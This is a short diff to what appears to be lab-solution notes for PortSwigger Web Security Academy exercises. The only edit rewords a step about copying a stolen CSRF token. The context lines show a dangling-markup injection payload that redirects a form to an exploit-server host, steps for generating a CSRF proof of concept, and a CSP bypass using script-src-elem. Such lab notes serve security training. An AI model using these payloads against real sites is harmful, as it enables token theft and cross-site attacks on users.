@@ -2619,7 +2619,7 @@ Content-Type: application/json
 	location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email="></form><form class="login_form" name="myform" action="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button';
     </script>
     ```
-  - copy the CSRF token from 'Poll Now'
+  - Access log, copy the CSRF token
   - Generate CSRF PoC and replace the CSRF token
 - Reflected XSS protected by CSP, with **CSP bypass**
   - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
